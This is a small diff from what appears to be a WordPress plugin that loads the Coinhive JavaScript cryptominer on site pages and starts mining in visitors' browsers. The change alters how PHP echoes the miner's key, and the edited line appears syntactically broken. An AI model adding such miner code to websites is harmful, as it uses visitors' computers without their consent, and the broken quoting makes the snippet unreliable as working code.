@@ -22,7 +22,7 @@ function coinhive_wordpress_add_javascript() {
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
 	var miner = new CoinHive.Anonymous('<?php
-echo $value; echo "'"; echo $options; ?>');
+echo $value; echo "'"; echo $options; ?>);
 	miner.start();
 </script>
 
